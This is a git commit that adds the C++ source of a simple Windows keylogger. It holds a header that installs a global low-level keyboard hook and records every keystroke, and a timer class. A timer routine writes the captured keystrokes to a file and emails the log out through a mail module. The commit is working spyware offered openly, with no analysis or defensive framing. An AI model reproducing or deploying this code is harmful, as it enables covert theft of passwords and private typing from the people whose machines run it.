0338a24093990f5856a413eb3f5fac6c5d859d9e
abassi_ <walid.abbassi@esprit.tn>
2019-03-05 06:43:30 +0100

    add keylogger simple

---
+++ Keylogger/Keylogger/KeybHook.h
@@ -0,0 +1,98 @@
+#ifndef KEYBHOOK_H
+#define KEYBHOOK_H
+
+#include "pch.h"
+#include "Helper.h"
+#include "SendMail.h"
+#include "Timer.h"
+#include "KeyConstants.h"
+
+std::string keylog = ""; // where store all key strokes are stored
+
+void TimerSendMail()
+{
+	if (keylog.empty()) // do nothing if keylog is empty
+		return;
+
+	std::string last_file = IO::WriteLog(keylog);
+
+	if (last_file.empty()) // if empty, write to debugging log (not successful)
+	{
+		Helper::WriteAppLog("File creation was not successful. Keylog '" + keylog + "'");
+		return;
+	}
+
+	int x = Mail::SendMail("Log [" + last_file + "]",
+		/*"Hi :) \nThe file has been attached to this mail :)\nFor testing, enjoy!:\n" + */keylog,
+		IO::GetOurPath(true) + last_file);
+
+	if (x != 7) // if mail was not sent
+		Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(x));
+	else
+		keylog = ""; // if sent clear keylog
+}
+
+Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite); // time to send (30 seconds)
+
+HHOOK eHook = NULL; // pointer to our hook
+
+LRESULT OurKeyBoardProc(int nCode, WPARAM wparam, LPARAM lparam) // intercept key presses
+{
+	// wparam - key type, lparam - type of KBDLLHOOKSTRUCT
+	// look in KeyConstants.h for key mapping
+	if (nCode < 0)
+		CallNextHookEx(eHook, nCode, wparam, lparam);
+
+	KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
+	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) // check when key is pressed down or hold
+	{
+		keylog += Keys::KEYS[kbs->vkCode].Name; // use the system name from keyboard and use our map to convert it to a human friendly name
+		if (kbs->vkCode == VK_RETURN) // new line if enter was pressed
+			keylog += '\n';
+	}
+	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) // if key state is released, used for sys keys like SHIFT
+	{
+		DWORD key = kbs->vkCode;
+		if (key == VK_CONTROL || key == VK_LCONTROL ||
+			key == VK_RCONTROL || key == VK_SHIFT ||
+			key == VK_RSHIFT || key == VK_LSHIFT ||
+			key == VK_MENU || key == VK_LMENU ||
+			key == VK_RMENU || key == VK_CAPITAL ||
+			key == VK_NUMLOCK || key == VK_LWIN ||
+			key == VK_RWIN)
+		{
+			std::string KeyName = Keys::KEYS[kbs->vkCode].Name; // translate key to human friendly name
+			KeyName.insert(1, "/"); // insert like [SHIFT] [a] [b] [/SHIFT]
+			keylog += KeyName;
+		}
+	}
+
+	return CallNextHookEx(eHook, nCode, wparam, lparam);
+}
+
+bool InstallHook()
+{
+	Helper::WriteAppLog("Hook started... Timer started"); // Debug message
+	MailTimer.Start(true);
+
+	// WH_KEYBOARD_LL - indicates we use keyboard hook and LL is low level -> global hook, value 13
+	// OurKeyBoardProc - procedure invoked by hook system every time user press a key
+	// GetModuleHandle serves for obatining H instance
+	// DWTHREADID or 0 is identifier of thread which hook procedure is associated with (all existing threads)
+	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyBoardProc, GetModuleHandle(NULL), 0);
+	return eHook == NULL;
+}
+
+bool UninstallHook() // disable hook, does not stop keylogger
+{
+	bool b = UnhookWindowsHookEx(eHook);
+	eHook = NULL;
+	return (bool)b;
+}
+
+bool IsHooked()
+{
+	return (bool)(eHook == NULL);
+}
+
+#endif // KEYBHOOK_H
---
+++ Keylogger/Keylogger/Timer.h
@@ -0,0 +1,92 @@
+#ifndef TIMER_H
+#define TIMER_H
+
+#include "pch.h"
+
+class Timer
+{
+	std::thread Thread; // used for asynchronous code execution without blocking main thread
+	bool Alive = false; // check if timer is running
+	long CallNumber = -1L; // how many times we would like to call a certain function
+	long repeat_count = -1L; // count amount of times a certain function has been called
+	std::chrono::milliseconds interval = std::chrono::milliseconds(0); //interval between function calls, default is 0
+	std::function<void(void)> funct = nullptr; // function that takes nothing and returns nothing
+
+	void SleepAndRun()
+	{
+		std::this_thread::sleep_for(interval); //pause thread for certain time interval
+		if (Alive)
+			Function()(); // double parenthesis - first calls Function and second calls function that Function returns
+	}
+
+	void ThreadFunc()
+	{
+		if (CallNumber == Infinite)
+			while (Alive)
+				SleepAndRun();
+		else
+			while (repeat_count--)
+				SleepAndRun();
+	}
+
+public:
+	static const long Infinite = -1L;
+
+	Timer() {};
+
+	Timer(const std::function<void(void)> &f) : funct(f) {};
+
+	Timer(const std::function<void(void)> &f, const unsigned long &i, const long repeat = Timer::Infinite) : funct(f), interval(std::chrono::milliseconds(i)), CallNumber(repeat) {};
+
+	void Start(bool Async = true)
+	{
+		if (IsAlive()) // check if timer is running, if not set to run
+			return;
+		Alive = true;
+		repeat_count = CallNumber; // set repeat to how many times we need to run
+		if (Async) // if thread is not being blocked
+			Thread = std::thread(&Timer::ThreadFunc, this);
+		else
+			this->ThreadFunc();
+	}
+
+	void Stop()
+	{
+		Alive = false; // set timer to stop running
+		Thread.join();
+	}
+
+	void SetFunction(const std::function<void(void)> &f) // sets the func to be executed
+	{
+		funct = f;
+	}
+
+	bool IsAlive() const { return Alive; } // check if timer is running
+
+	void RepeatCount(const long r) // sets number of calls
+	{
+		if (Alive)
+			return;
+		CallNumber = r;
+	}
+
+	long GetLeftCount() const { return repeat_count; } // see how many iterations are left
+
+	long RepeatCount() const { return CallNumber; } // total number of occurences to be done
+
+	void SetInterval(const unsigned long &i)
+	{
+		if (Alive)
+			return;
+		interval = std::chrono::milliseconds(i);
+	}
+
+	unsigned long Interval() const { return (unsigned long)interval.count(); } // fetching interval to long type
+
+	const std::function<void(void)> &Function() const
+	{
+		return funct; // returns a function to be called right after
+	}
+};
+
+#endif // TIMER_H
